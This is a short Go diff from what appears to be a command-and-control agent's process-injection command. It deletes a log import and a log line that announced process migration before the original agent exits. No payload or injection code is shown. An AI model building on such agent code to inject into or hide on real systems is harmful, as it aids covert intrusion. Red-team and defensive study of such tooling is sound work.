@@ -5,7 +5,6 @@ package commands
 import (
 	"encoding/base64"
 	"fmt"
-	"log"
 	"os"
 	"runtime"
 	"strings"
@@ -70,7 +69,6 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 			result.Output += "[*] Scheduling agent exit in 5 seconds to allow response delivery...\n"
 			go func() {
 				time.Sleep(5 * time.Second)
-				log.Printf("process migration complete — exiting original agent")
 				os.Exit(0)
 			}()
 		}
